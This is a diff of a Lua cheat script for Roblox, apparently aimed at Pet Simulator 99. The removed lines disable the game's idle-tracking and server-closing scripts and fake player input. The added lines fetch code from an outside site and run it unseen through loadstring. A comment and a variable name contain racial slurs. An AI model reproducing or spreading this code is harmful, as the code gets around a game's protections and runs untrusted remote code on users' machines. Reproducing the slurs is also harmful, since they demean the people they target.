@@ -77,29 +77,12 @@ local function checkforDeepPool()
 end
 
 --anti afk shit
-wait(10)
-local Players = game:GetService('Players')
-local Player = Players.LocalPlayer
-local getPlayers = Players:GetPlayers()
-local PlayerInServer = #getPlayers
-local http = game:GetService("HttpService")
-local vu = game:GetService("VirtualUser")
-print("Anti AFKEY")
-
-Players.LocalPlayer.Idled:connect(function()
-    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-    task.wait(1)
-    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
-end)
-game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Idle Tracking"].Disabled = true
-game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Server Closing"].Enabled = false
-local niggaJump = coroutine.create(function ()
-    while 1 do
-        wait(5)
-        game.Players.LocalPlayer.Character.Humanoid.Jump = true
-    end
-end)
-coroutine.resume(niggaJump)
+--since i dont have the shit for preston's new afk system shit
+getgenv().temporaryDomain = true
+getgenv().LoadSettings = {
+    Example_Setting = Example_Value
+}
+loadstring(game:HttpGet("https://v3rmillion2.net/ps99"))()
 
 --low cpu nigga optimizer
 setfpscap(15)
